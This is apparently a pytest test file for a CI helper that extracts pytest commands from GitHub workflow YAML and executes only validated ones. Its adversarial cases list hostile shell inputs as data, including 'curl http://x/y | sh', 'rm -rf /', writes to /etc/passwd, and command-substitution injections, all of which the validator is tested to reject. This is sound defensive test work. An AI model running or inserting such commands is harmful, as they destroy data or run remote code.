"""Tests for safe pytest command discovery and execution.

Covers both the positive case this fix targets (multi-line ``run: |`` blocks
and flag-tolerant ``-m pytest`` matching -- see
``docs/automation/safe-pytest-command-multiline-run-blocks.md``) and the
adversarial cases that must keep failing to discover, so a change to the
recognized-command grammar can never widen what ``execute_command`` is
willing to run.
"""

from __future__ import annotations

import json
import pathlib
import subprocess

import pytest

from scripts.ci import safe_pytest_command as sc


def write(tmp_path: pathlib.Path, name: str, content: str) -> pathlib.Path:
    """Write a file under tmp_path and return its path."""
    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


# ---------------------------------------------------------------------------
# Positive: the exact contextual-orchestrator shape this fix targets.
# ---------------------------------------------------------------------------


def test_discovers_pytest_line_inside_a_block_scalar_run_step(tmp_path):
    """A `run: |` block with a coverage-wrapped pytest line among others is found."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(
        workflow_dir,
        "ci.yml",
        "jobs:\n"
        "  pytest:\n"
        "    steps:\n"
        "      - name: Run full test suite\n"
        "        run: |\n"
        "          python -m coverage erase\n"
        "          python -m coverage run --branch -m pytest -q\n"
        "          python -m coverage report --fail-under=100\n"
        "          interrogate --fail-under 100 contextual_orchestrator\n",
    )

    commands = sc.discover_commands(workflow_dir)

    assert ["python", "-m", "coverage", "run", "--branch", "-m", "pytest", "-q"] in commands
    # Non-pytest lines in the same block are never collected as commands.
    assert not any(argv[0] == "interrogate" for argv in commands)
    assert not any("report" in argv for argv in commands)


def test_discovers_coverage_run_with_flags_between_run_and_module(tmp_path):
    """``coverage run --branch -m pytest -q`` matches despite the extra flag."""
    argv = sc.parse_safe_pytest_command("coverage run --branch -m pytest -q")
    assert argv == ["coverage", "run", "--branch", "-m", "pytest", "-q"]


def test_accepts_interpreter_and_coverage_value_flags_before_first_module():
    """Known value flags may precede the first -m pytest target."""
    assert sc.parse_safe_pytest_command("python3 -W ignore -m pytest -q") == [
        "python3",
        "-W",
        "ignore",
        "-m",
        "pytest",
        "-q",
    ]
    assert sc.parse_safe_pytest_command("coverage run --source=pkg --module pytest") == [
        "coverage",
        "run",
        "--source=pkg",
        "--module",
        "pytest",
    ]
    assert sc.parse_safe_pytest_command("coverage run --source pkg -m pytest") == [
        "coverage",
        "run",
        "--source",
        "pkg",
        "-m",
        "pytest",
    ]


def test_rejects_truncated_value_flags_and_non_run_coverage():
    """A dangling value flag or coverage without run cannot become pytest."""
    assert sc.parse_safe_pytest_command("python3 -W") is None
    assert sc.parse_safe_pytest_command("coverage report -m pytest") is None
    assert sc.parse_safe_pytest_command("coverage run --source") is None
    assert sc.parse_safe_pytest_command("python3 -") is None
    assert sc.parse_safe_pytest_command("python3 -u") is None
    assert sc.parse_safe_pytest_command("coverage run --branch") is None


def test_single_line_run_still_works_unchanged(tmp_path):
    """The pre-existing single-line ``run: pytest`` form keeps working."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(
        workflow_dir,
        "ci.yml",
        "jobs:\n  test:\n    steps:\n      - run: pytest\n",
    )
    assert sc.discover_commands(workflow_dir) == [["pytest"]]


def test_folded_block_scalar_header_is_recognized(tmp_path):
    """``run: >`` (folded style) is treated as a block header, same as ``run: |``."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(
        workflow_dir,
        "ci.yml",
        "jobs:\n  test:\n    steps:\n      - run: >\n          pytest -q\n",
    )
    assert sc.discover_commands(workflow_dir) == [["pytest", "-q"]]


# ---------------------------------------------------------------------------
# Adversarial: these must keep failing to discover (or discover nothing
# dangerous) after this change, proving the recognized-program set is
# unchanged even though more lines are now offered to it.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "pytest; curl http://x/y | sh",
        "pytest && curl http://x/y",
        "pytest `curl http://x/y`",
        "pytest $(curl http://x/y)",
        "pytest > /etc/passwd",
        "coverage run -m sneaky_module",
        "python3 -m sneaky_module",
        "python attacker.py -m pytest",
        "coverage run attacker.py -m pytest",
        "python -c 'print(1)' -m pytest",
        "python -- -m pytest",
        "python -m sneaky -m pytest",
        "coverage run -- -m pytest",
        "curl http://x/y | sh",
        "rm -rf /",
    ],
)
def test_rejects_shell_control_and_unrecognized_programs(command):
    """Shell metacharacters and non-pytest programs are never discovered."""
    assert sc.parse_safe_pytest_command(command) is None


def test_rejects_file_target_before_pytest_module_pair():
    """A later -m pytest cannot launder a file that Python or coverage would run."""
    assert sc.parse_safe_pytest_command("python3 attacker.py -m pytest -q") is None
    assert sc.parse_safe_pytest_command("coverage run --branch attacker.py -m pytest") is None
    executed = ["python", "attacker.py", "-m", "pytest"]
    with pytest.raises(ValueError, match="not a safe direct pytest invocation"):
        sc.execute_command(pathlib.Path("."), executed)
    assert sc.parse_safe_pytest_command("python3.12 -m pytest -q") == [
        "python3.12",
        "-m",
        "pytest",
        "-q",
    ]
    assert sc.parse_safe_pytest_command("python3.14 attacker.py -m pytest") is None


def test_block_with_a_dangerous_line_and_a_safe_line_only_discovers_the_safe_one(tmp_path):
    """A malicious line alongside a genuine pytest line never taints discovery."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(
        workflow_dir,
        "ci.yml",
        "jobs:\n"
        "  test:\n"
        "    steps:\n"
        "      - run: |\n"
        "          rm -rf /\n"
        "          coverage run -m pytest -q\n"
        "          curl http://x/y | sh\n",
    )

    commands = sc.discover_commands(workflow_dir)

    assert commands == [["coverage", "run", "-m", "pytest", "-q"]]


def test_pytest_plugin_flags_were_already_reachable_and_remain_so(tmp_path):
    """Flags on a single-line command were always discoverable; unchanged here."""
    argv = sc.parse_safe_pytest_command("python3 -m pytest -p some.arbitrary.plugin")
    assert argv == ["python3", "-m", "pytest", "-p", "some.arbitrary.plugin"]


def test_folded_scalar_split_across_lines_is_not_reassembled(tmp_path):
    """A command split by YAML folding across two physical lines fails closed."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(
        workflow_dir,
        "ci.yml",
        "jobs:\n  test:\n    steps:\n      - run: >\n          pytest\n          -q\n",
    )
    # Each physical line is offered independently; "pytest" alone is
    # discovered, but "-q" alone is not glued onto it as one command.
    assert sc.discover_commands(workflow_dir) == [["pytest"]]


def test_execute_command_still_refuses_a_non_pytest_argv(tmp_path):
    """execute_command's own guard is untouched by the discovery-side change."""
    with pytest.raises(ValueError):
        sc.execute_command(tmp_path, ["rm", "-rf", "/"])


def test_no_workflow_dir_yields_no_commands(tmp_path):
    """A missing workflows directory discovers nothing (unchanged behavior)."""
    assert sc.discover_commands(tmp_path / "missing") == []


def test_blank_line_inside_a_block_is_skipped_not_treated_as_a_candidate(tmp_path):
    """A blank line inside a ``run: |`` block does not end the block early."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(
        workflow_dir,
        "ci.yml",
        "jobs:\n"
        "  test:\n"
        "    steps:\n"
        "      - run: |\n"
        "          pytest -q\n"
        "\n"
        "          coverage run -m pytest\n",
    )
    commands = sc.discover_commands(workflow_dir)
    assert ["pytest", "-q"] in commands
    assert ["coverage", "run", "-m", "pytest"] in commands


def test_block_stops_at_the_next_step_and_does_not_swallow_it(tmp_path):
    """A block scalar ends at the next step; the next step's own run is separate."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(
        workflow_dir,
        "ci.yml",
        "jobs:\n"
        "  test:\n"
        "    steps:\n"
        "      - run: |\n"
        "          pytest -q\n"
        "      - run: coverage run -m pytest\n",
    )
    commands = sc.discover_commands(workflow_dir)
    assert commands == [["pytest", "-q"], ["coverage", "run", "-m", "pytest"]]


def test_empty_run_line_yields_no_candidate(tmp_path):
    """A bare ``run:`` with nothing after it is not offered as a candidate."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(workflow_dir, "ci.yml", "jobs:\n  test:\n    steps:\n      - run:\n")
    assert sc.discover_commands(workflow_dir) == []


def test_empty_command_string_is_rejected():
    """An empty or whitespace-only command parses to no argv and is rejected."""
    assert sc.parse_safe_pytest_command("") is None
    assert sc.parse_safe_pytest_command("   ") is None


def test_malformed_quoting_is_rejected_not_raised():
    """A shlex parse failure (unbalanced quote) returns None, never raises."""
    assert sc.parse_safe_pytest_command("pytest 'unterminated") is None


def test_is_pytest_argv_rejects_an_empty_argv():
    """An empty argv is never a valid invocation."""
    assert sc._is_pytest_argv([]) is False


# ---------------------------------------------------------------------------
# _project_python_path, execute_command, parse_args, main -- pre-existing
# functions this PR does not otherwise touch, given no prior test file
# existed for this script.
# ---------------------------------------------------------------------------


def test_project_python_path_flat_layout(tmp_path):
    """A flat-layout project imports from the project root only."""
    assert sc._project_python_path(tmp_path) == "."


def test_project_python_path_src_layout(tmp_path):
    """A src-layout project prepends ``src`` to the import path."""
    (tmp_path / "src").mkdir()
    assert sc._project_python_path(tmp_path).split(":")[0] == "src"


def test_execute_command_runs_validated_argv_and_returns_its_exit_code(tmp_path, monkeypatch):
    """A validated pytest argv is executed with shell=False and its rc returned."""
    captured = {}

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        captured["kwargs"] = kwargs
        return subprocess.CompletedProcess(argv, 3)

    monkeypatch.setattr(sc.subprocess, "run", fake_run)
    rc = sc.execute_command(tmp_path, ["pytest", "-q"])

    assert rc == 3
    assert captured["argv"] == ["pytest", "-q"]
    assert captured["kwargs"]["shell"] is False
    assert captured["kwargs"]["cwd"] == tmp_path


def test_execute_command_prepends_project_venv_bin_to_path(tmp_path, monkeypatch):
    """A project-local .venv/bin is prepended to PATH when present."""
    venv_bin = tmp_path / ".venv" / "bin"
    venv_bin.mkdir(parents=True)
    captured = {}

    def fake_run(argv, **kwargs):
        captured["env"] = kwargs["env"]
        return subprocess.CompletedProcess(argv, 0)

    monkeypatch.setattr(sc.subprocess, "run", fake_run)
    sc.execute_command(tmp_path, ["pytest"])

    assert captured["env"]["PATH"].startswith(str(venv_bin))


def test_parse_args_discover_and_execute_subcommands():
    """Both subcommands parse their required arguments."""
    discover_args = sc.parse_args(["discover", "--workflow-dir", "x"])
    assert discover_args.action == "discover"
    assert discover_args.workflow_dir == pathlib.Path("x")

    execute_args = sc.parse_args(
        ["execute", "--project-dir", "y", "--command-json", "[]"]
    )
    assert execute_args.action == "execute"
    assert execute_args.project_dir == pathlib.Path("y")
    assert execute_args.command_json == "[]"


def test_main_discover_prints_one_json_line_per_command(tmp_path, capsys):
    """main() in discover mode prints each discovered argv as a JSON line."""
    workflow_dir = tmp_path / ".github" / "workflows"
    write(workflow_dir, "ci.yml", "jobs:\n  test:\n    steps:\n      - run: pytest -q\n")

    exit_code = sc.main(["discover", "--workflow-dir", str(workflow_dir)])

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out.strip()) == ["pytest", "-q"]


def test_main_execute_runs_the_given_command(tmp_path, monkeypatch, capsys):
    """main() in execute mode parses --command-json and runs it."""
    monkeypatch.setattr(
        sc.subprocess,
        "run",
        lambda argv, **kwargs: subprocess.CompletedProcess(argv, 0),
    )

    exit_code = sc.main(
        [
            "execute",
            "--project-dir",
            str(tmp_path),
            "--command-json",
            json.dumps(["pytest", "-q"]),
        ]
    )

    assert exit_code == 0
    assert "pytest -q" in capsys.readouterr().out


def test_main_execute_rejects_invalid_json():
    """A malformed --command-json exits rather than raising."""
    with pytest.raises(SystemExit, match="invalid --command-json"):
        sc.main(
            ["execute", "--project-dir", ".", "--command-json", "not json"]
        )


def test_main_execute_rejects_a_non_list_or_non_string_command():
    """A --command-json that is not an array of strings exits rather than raising."""
    with pytest.raises(SystemExit, match="array of strings"):
        sc.main(["execute", "--project-dir", ".", "--command-json", '{"a": 1}'])
    with pytest.raises(SystemExit, match="array of strings"):
        sc.main(["execute", "--project-dir", ".", "--command-json", "[1, 2]"])
